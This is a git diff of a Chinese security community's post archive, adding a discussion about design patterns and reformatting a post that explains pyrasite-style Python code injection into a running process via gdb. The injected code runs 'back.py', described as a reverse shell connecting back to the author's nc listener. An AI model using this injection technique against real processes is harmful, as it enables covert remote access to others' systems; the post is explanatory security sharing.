@@ -17,7 +17,7 @@
 - [CTF](#ctf)
 - [HTML](#html)
 - [Docker](#docker)
-- [Python](#Python)
+- [Python](#python)
 
 ## 技能树
 
@@ -226,6 +226,45 @@ __#资源#__
 __分享文件:__
 [黑客报告2017.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/%E9%BB%91%E5%AE%A2%E6%8A%A5%E5%91%8A2017.pdf)
 
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-05:
+
+
+__#经验#__
+
+给大家分享篇老文《用追MM来解释23种设计模式》
+
+
+[http://www.jianshu.com/p/84f19e25aeac](http://www.jianshu.com/p/84f19e25aeac)
+
+ 
+
+为什么分享这个呢？当年我刚接触编程时，设计模式这玩意理解了很久，一直很模糊，毕竟当时没什么实战经验，后来看到这篇文章...作者这科普膜拜得不行啊。
+
+之前经验分享说过，玩安全一定要玩好编程。那现在再补上一句：玩好编程，一定要理解透各种设计模式。
+
+设计模式不是只有这些，至于为什么，你以后会知道的。😏
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 推荐一本书，大话设计模式
+
+<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 推荐一种编程方式，天生就自带设计模式，他就是函数编程
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 这种方式很赞很赞
+
+<img src="https://file.xiaomiquan.com/2b/f9/2bf9e6206c897d781f31230a6f9923b346da1a247d2a1822470bf25995a3659f.jpg" width="25px"/> __winlans__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 我感觉设计模式之蝉更好点或许
+
+<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 弦哥，有研究s2-048吗
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 意义不大
+
+
+...
 
 ---
 
@@ -952,7 +991,9 @@ __#姿势#__
 
 我昨晚读了一遍 pyrasite 源码，很快就明白了本质的原理，这里给大家分享下（以 Linux 环境下的情况为例，需要 root 权限）。其实关键语句就这句：
 
-`gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("print(\"hiworld\")")' -eval-command='call PyGILState_Release($1)'`
+```
+gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("print(\"hiworld\")")' -eval-command='call PyGILState_Release($1)'
+```
 
 对，gdb，这是经典的调试神器了，玩过 gdb 的都知道，这个神器支持直接对目标进程运行态进行动态调试，不过这有个前提，需要开启：
 
@@ -964,7 +1005,9 @@ __#姿势#__
 
 好，现在可以注入 Python 代码，打印 hiworld 了，那么我们注入个反弹到我们的远程 nc 吧。
 
-`gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("exec(open(\"back.py\").read())")' -eval-command='call PyGILState_Release($1)'`
+```
+gdb -p 3142 --batch -eval-command='call PyGILState_Ensure()' -eval-command='call PyRun_SimpleString("exec(open(\"back.py\").read())")' -eval-command='call PyGILState_Release($1)'
+```
 
 其中，back.py 就是一个反弹脚本，反弹连接到我们的 nc 监听上：
 
